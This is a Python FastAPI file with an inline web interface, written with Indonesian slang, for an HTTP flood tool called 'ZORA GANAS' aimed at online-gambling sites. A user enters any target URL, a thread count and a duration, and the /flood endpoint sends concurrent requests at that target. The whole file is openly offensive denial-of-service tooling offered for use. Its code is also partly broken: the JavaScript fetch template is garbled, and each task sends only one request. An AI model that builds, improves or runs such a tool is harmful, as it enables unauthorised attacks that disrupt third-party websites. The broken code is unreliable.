from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
import httpx
import asyncio
import random
import uvicorn

app = FastAPI(title="ZORA DARK - GANAS MODE")

# UI dark serem brutal (inline)
DARK_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ZORA DARK GANAS - BANTAI</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { background: #000000; color: #ff0000; font-family: monospace; overflow: hidden; }
    .glitch { animation: glitch 1s infinite; text-shadow: 0 0 15px #f00, 0 0 30px #f00; }
    @keyframes glitch {
      0% { transform: translate(0); }
      20% { transform: translate(-5px, 5px); text-shadow: 5px 0 #f00, -5px 0 #0f0; }
      40% { transform: translate(5px, -5px); text-shadow: -5px 0 #f00, 5px 0 #0f0; }
      60% { transform: translate(-5px, 5px); }
      80% { transform: translate(5px, -5px); }
      100% { transform: translate(0); }
    }
    #log { background: #0a0000; border: 4px solid #660000; height: 250px; overflow-y: auto; padding: 1.5rem; font-size: 1.1rem; }
    .blood { color: #ff3333; font-weight: bold; }
  </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4 relative">
  <div class="absolute inset-0 bg-gradient-to-b from-transparent via-red-950/30 to-black pointer-events-none"></div>
  <h1 class="text-8xl font-black glitch mb-8 z-10">ZORA GANAS</h1>
  <p class="text-4xl mb-10 text-red-700 tracking-widest z-10">BLOOD MODE ACTIVATED - FUCK JUDOL</p>

  <input id="target" placeholder="TARGET URL (https://anjing.com)" class="w-full max-w-2xl p-6 bg-black border-4 border-red-900 rounded-2xl text-red-300 text-3xl mb-8 focus:border-red-600 z-10">

  <div class="w-full max-w-2xl grid grid-cols-2 gap-6 mb-8 z-10">
    <input id="threads" type="number" value="50" placeholder="Threads (max 100)" class="p-6 bg-black border-4 border-red-900 rounded-2xl text-red-300 text-2xl">
    <input id="duration" type="number" value="300" placeholder="Duration (detik)" class="p-6 bg-black border-4 border-red-900 rounded-2xl text-red-300 text-2xl">
  </div>

  <div class="w-full max-w-2xl flex gap-6 z-10">
    <button id="startBtn" class="flex-1 bg-gradient-to-r from-red-950 to-black hover:from-red-800 hover:to-red-900 text-white font-black py-8 px-12 rounded-2xl text-4xl transition transform hover:scale-110 shadow-2xl shadow-red-950">
      BANTAI 🔥
    </button>
    <button id="stopBtn" disabled class="flex-1 bg-gray-900 text-gray-600 font-black py-8 px-12 rounded-2xl text-4xl cursor-not-allowed">
      STOP
    </button>
  </div>

  <div id="log" class="w-full max-w-2xl mt-10 p-8 bg-black border-4 border-red-900 rounded-2xl text-green-500 text-xl font-mono overflow-y-auto max-h-[400px] z-10">
    Zora ganas mode ON... Masukin target & bantai.
  </div>

  <script>
    const log = document.getElementById('log');
    let attacking = false;

    document.getElementById('startBtn').onclick = async () => {
      if (attacking) return;
      const target = document.getElementById('target').value.trim();
      if (!target || !target.startsWith('http')) return alert('URL salah ajg!');
      const threads = parseInt(document.getElementById('threads').value) || 50;
      const duration = parseInt(document.getElementById('duration').value) || 300;

      attacking = true;
      document.getElementById('startBtn').disabled = true;
      document.getElementById('stopBtn').disabled = false;
      log.innerHTML += '<br><span class="blood">[BANTAI START]</span> Target: ' + target + ' | Threads: ' + threads + ' | Durasi: ' + duration + 's';

      try {
        const res = await fetch(`/flood?target=\( {encodeURIComponent(target)}&threads= \){threads}&duration=${duration}`);
        const txt = await res.text();
        log.innerHTML += '<br><span class="blood">' + txt + '</span>';
      } catch (e) {
        log.innerHTML += '<br><span class="text-yellow-500">[ERROR]</span> ' + e;
      }
      attacking = false;
      document.getElementById('startBtn').disabled = false;
      document.getElementById('stopBtn').disabled = true;
    };

    document.getElementById('stopBtn').onclick = () => {
      log.innerHTML += '<br><span class="text-yellow-500">[STOPPED]</span> Bantai dihentikan.';
      attacking = false;
      document.getElementById('startBtn').disabled = false;
      document.getElementById('stopBtn').disabled = true;
    };
  </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def root():
    return DARK_HTML

@app.get("/flood")
async def flood(target: str = Query(...), threads: int = Query(50), duration: int = Query(300)):
    start_time = asyncio.get_event_loop().time()
    count = 0

    async def send_request():
        nonlocal count
        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                await client.get(target, follow_redirects=True)
                count += 1
            except:
                pass

    tasks = [asyncio.create_task(send_request()) for _ in range(threads)]
    await asyncio.sleep(duration)
    for t in tasks:
        t.cancel()

    elapsed = asyncio.get_event_loop().time() - start_time
    return f"[ZORA GANAS] Serangan selesai! Requests terkirim: {count} | Durasi real: {elapsed:.1f}s | Target: {target}"

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)